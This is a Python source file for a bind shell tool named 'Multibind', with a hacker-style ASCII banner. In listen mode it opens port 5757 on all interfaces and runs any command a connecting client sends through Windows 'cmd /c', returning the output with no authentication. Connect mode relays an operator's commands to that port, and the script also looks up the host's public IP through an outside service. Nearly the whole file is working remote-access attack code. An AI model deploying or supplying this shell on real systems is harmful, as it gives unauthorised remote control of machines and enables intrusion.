
import socket
import subprocess
import threading
import argparse
import platform
import time
import requests
import os
from colorama import init, Fore, Back, Style

os_type = platform.platform()
pwd = os.getcwd

DEFAULT_PORT = 5757
MAX_BUFFER = 4096


def haxor_print(text, leading_spaces=0):

    text_chars = list(text)
    current, mutated = '', ''

    for i in range(len(text)):

        original = text_chars[i]
        current += original
        mutated += f'\033[1;38;5;82m{text_chars[i].upper()}\033[0m'
        print(f'\r{" " * leading_spaces}{mutated}', end='')
        time.sleep(0.05)
        print(f'\r{" " * leading_spaces}{current}', end='')
        mutated = current

    print(f'\r{" " * leading_spaces}{text}\n')


def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            return "Failed to fetch public IP"
    except Exception as e:
        return "Error: " + str(e)


public_ip = get_public_ip()


def execute_bash(bash):
    try:
        output = subprocess.check_output("bash {}".format(bash),
                                         stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output


def execute_cmd(cmd):
    try:
        output = subprocess.check_output(
            "cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output


def decode_and_strip(s):
    return s.decode("latin-1").strip()


def shell_thread(s):
    s.send(b"[ -- Connected! --]")

    try:
        while True:

            s.send(b"\r\nEnter Command> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing Command: '{}'".format(buffer))
            s.send(execute_cmd(buffer))

    except:
        s.close()
        exit()


def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()


def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print("\n" + data, end="", flush=True)
    except:
        s.close()
        exit()


def banner():
    print(Fore.GREEN + """
   ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███ 
 ███   ███   ███ ███    ███ ███          ▀███▀▀██ ███▌
 ███   ███   ███ ███    ███ ███           ███   ▀ ███▌
 ███   ███   ███ ███    ███ ███           ███     ███▌
 ███   ███   ███ ███    ███ ███           ███     ███ 
 ███   ███   ███ ███    ███ ███▌    ▄     ███     ███ 
  ▀█   ███   █▀  ████████▀  █████▄▄██    ▄████▀   █▀  
                            ▀                         
▀█████████▄   ▄█  ███▄▄▄▄   ████████▄                 
  ███    ███ ███  ███▀▀▀██▄ ███   ▀███                
  ███    ███ ███▌ ███   ███ ███    ███                
 ▄███▄▄▄██▀  ███▌ ███   ███ ███    ███                
▀▀███▀▀▀██▄  ███▌ ███   ███ ███    ███                
  ███    ██▄ ███  ███   ███ ███    ███                
  ███    ███ ███  ███   ███ ███   ▄███                
▄█████████▀  █▀    ▀█   █▀  ████████▀                                                               
        """ + Fore.RESET)


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    banner()
    haxor_print("--- Starting Bind Shell ---", 0)
    haxor_print("[+] Opened Port: {}{}".format(DEFAULT_PORT, Fore.GREEN), 0)
    while True:
        client_socket, addr = s.accept()
        print("[+] New Bind From: {}".format(public_ip))
        threading.Thread(target=shell_thread, args=(client_socket,)).start()


def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    haxor_print("--- Connnecting to Multibind ---")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true",
                    help="Setup a bind shell", required=False)

parser.add_argument("-c", "--connect",
                    help="Connect to a bind shell", required=False)

args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)
